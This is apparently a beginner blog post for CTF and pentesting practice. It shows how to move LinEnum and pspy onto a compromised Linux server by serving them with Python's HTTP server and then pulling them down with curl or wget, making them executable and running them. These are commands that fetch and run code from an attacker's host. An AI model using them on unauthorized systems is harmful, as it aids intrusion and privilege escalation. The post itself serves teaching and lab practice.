
+++
title = "Upload enumeration tools to a linux server"
date = "2019-07-21T1:00:00+02:00"
description = "One of the first things I was asking myself when finally getting access to a linux server at my very beginning was 'How do I even upload the enumeration tools to do the privilege escalation?'. I got the question from someone who was beginning on HTB recently so this short article might help."
draft = false
toc = false
categories = ["post"]
tags = ["enumeration", "ctf", "privesc", "linenum", "pspy"]
images = [
  "https://i.imgur.com/t7YRxYU.png"
] # overrides site-wide open graph image

+++

## Privilege Escalation (privesc)

When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.

Here are two extensive guides about privesc for Windows and Linux:
<ul>
<li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank">Windows privesc guide</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank"> Linux privesc guide</a></li>
</ul>

You'll notice in these guides that, to find the mistakes that will get us root, it's all about enumerating the server permissions, the programs running, the cron jobs, etc. And we have tools to do that for us!

I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post.
<br><br>

## The tools

From my <a href="/tools/pentest">Tools list</a>, you'll find these two very useful enumeration tools:

<a href="https://github.com/DominicBreuker/pspy" target="_blank">pspy</a>
{{< hackcss-alert type="info" >}}
pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
{{< /hackcss-alert >}}

<a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a>
{{< hackcss-alert type="info" >}}
Scripted Local Linux Enumeration & Privilege Escalation Checks.
{{< /hackcss-alert >}}
<br>

## The command lines

So now that we have the tools on our computer, how to get them to the compromised server?

Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.

{{< hackcss-alert type="info" >}}
python -m SimpleHTTPServer 80
{{< /hackcss-alert >}}

With python3:
{{< hackcss-alert type="info" >}}
python3 -m http.server 80
{{< /hackcss-alert >}}

Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!

So we launch the SimpleHTTPServer from the directory where we have our LinEnum and pspy programs. And from the compromised linux server, we write:
{{< hackcss-alert type="info" >}}
curl $yourIP/linenum.sh
{{< /hackcss-alert >}}

cURL is a command-line tool for getting or sending data including files using URL syntax. Now your downloaded program won't have the permission to run so to make it executable, write: 
{{< hackcss-alert type="info" >}}
chmod +x linenum.sh
{{< /hackcss-alert >}}

And now to execute it, write "./linenum.sh" in the server directory where the downloaded linenum program is. 

Sometimes, curl will not be authorized to be used by the user you compromised, but you can use wget in this case. Let's use pspy this time as an example:
{{< hackcss-alert type="info" >}}
wget $yourIP/pspy64
{{< /hackcss-alert >}}

Same thing now, we do "chmod +x pspy64" and then "./pspy64", and it will run!

<img src="https://raw.githubusercontent.com/DominicBreuker/pspy/master/images/demo.gif">

I hope this was a useful article! There are probably other ways to upload files to a server such as using <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!

Have fun uploading files now!

